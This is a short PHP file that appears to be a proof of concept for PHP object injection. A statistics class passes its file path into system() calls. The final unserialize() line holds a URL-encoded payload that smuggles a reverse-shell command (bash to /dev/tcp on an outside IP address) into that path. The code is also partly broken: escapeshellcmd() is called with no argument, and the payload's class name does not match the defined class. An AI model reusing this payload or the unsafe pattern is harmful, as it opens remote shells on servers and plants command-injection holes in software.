<?php

class StatisticsOriginal
{
    private $counter_output_path = "/tmp/counter";

    public function __construct()
    {
        if (!file_exists($this->counter_output_path))
        {
            echo "touch {$this->counter_output_path}";
            system("touch {$this->counter_output_path}");
        }
    }

    public function update($client_ip_address)
    {
        file_put_contents($this->counter_output_path, $client_ip_address . PHP_EOL, FILE_APPEND);
    }

    public function __destruct()
    {
        echo 'find ' . escapeshellcmd() . ' && echo Statistics Plugin version 1.0 is working';
        //system('find ' . escapeshellcmd($this->counter_output_path) . ' && echo Statistics Plugin version 1.0 is working');
    }

    public function getNumberOfVisitors()
    {
        return system("wc -l /tmp/counter | awk '{print $1}'");
    }
}

unserialize(urldecode('O%3A10%3A%22Statistics%22%3A1%3A%7Bs%3A31%3A%22%00Statistics%00counter_output_path%22%3Bs%3A60%3A%22%2Ftmp%2FBLAH_BLAH_1+%26%26+bash+-i+%3E%26+%2Fdev%2Ftcp%2F3.19.6.32%2F12513+0%3E%261%22%3B%7D'));